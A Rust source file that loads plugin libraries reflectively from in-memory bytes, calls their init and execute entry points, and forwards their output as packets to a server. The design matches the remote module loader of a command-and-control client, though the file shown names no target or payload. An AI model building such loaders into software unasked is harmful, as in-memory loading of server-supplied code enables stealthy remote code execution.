use std::sync::Arc;
use libload_reflective::safe::{ReflectedLibrary, Symbol};
use serde::Deserialize;
use std::ptr;
use common::packets::ServerboundPacket;
use crate::handler::send_packet;
use common::packets::Packet;

type PluginCallback = unsafe extern "C" fn(data_ptr: *const u8, data_len: usize);
type PluginExecute = unsafe extern "C" fn(
    input_ptr: *const u8,
    input_len: usize,
    output_ptr: *mut *const u8,
    output_len: *mut usize,
) -> i32;

pub struct Plugin {
    name: String,
    lib: &'static ReflectedLibrary,
    execute: Symbol<'static, PluginExecute>,
}

impl Plugin {
    pub fn new(name: String, bytes: Vec<u8>) -> anyhow::Result<Arc<Self>> {
        let lib = Box::leak(Box::new(ReflectedLibrary::new(bytes)?));
    
        // Borrow first
        let execute: Symbol<PluginExecute> = lib.get(b"plugin_execute")?;
        let plugin_init: Symbol<unsafe extern "C" fn(PluginCallback)> = lib.get(b"plugin_init")?;
    
        // Now no more borrows
        unsafe {
            plugin_init(plugin_callback);
        }
    
        let plugin = Arc::new(Self {
            name,
            lib, // lib moved after all borrows done
            execute,
        });
    
        Ok(plugin)
    }

    pub fn execute(&self, data: Vec<u8>) {
        let mut output_ptr: *const u8 = ptr::null();
        let mut output_len: usize = 0;

        let result = unsafe {
            (self.execute)(
                data.as_ptr(),
                data.len(),
                &mut output_ptr as *mut *const u8,
                &mut output_len as *mut usize,
            )
        };

        if result == 0 && !output_ptr.is_null() && output_len > 0 {
            let output_slice = unsafe { std::slice::from_raw_parts(output_ptr, output_len) };

            match ServerboundPacket::deserialized(output_slice) {
                Ok((packet, _)) => {
                    tokio::spawn(async move {
                        let _ = send_packet(packet).await;
                    });
                }
                Err(e) => {
                    println!("⚠️ Failed to deserialize plugin output: {:?}", e);
                }
            }
        } else {
            println!("❌ Plugin execution failed with code: {}", result);
        }
    }
}

unsafe extern "C" fn plugin_callback(data_ptr: *const u8, data_len: usize) {
    if !data_ptr.is_null() && data_len > 0 {
        let data = std::slice::from_raw_parts(data_ptr, data_len);

        match ServerboundPacket::deserialized(data) {
            Ok((packet, _)) => {
                tokio::spawn(async move {
                    let _ = send_packet(packet).await;
                });
            }
            Err(e) => {
                println!("⚠️ Failed to deserialize plugin spontaneous event: {:?}", e);
            }
        }
    }
}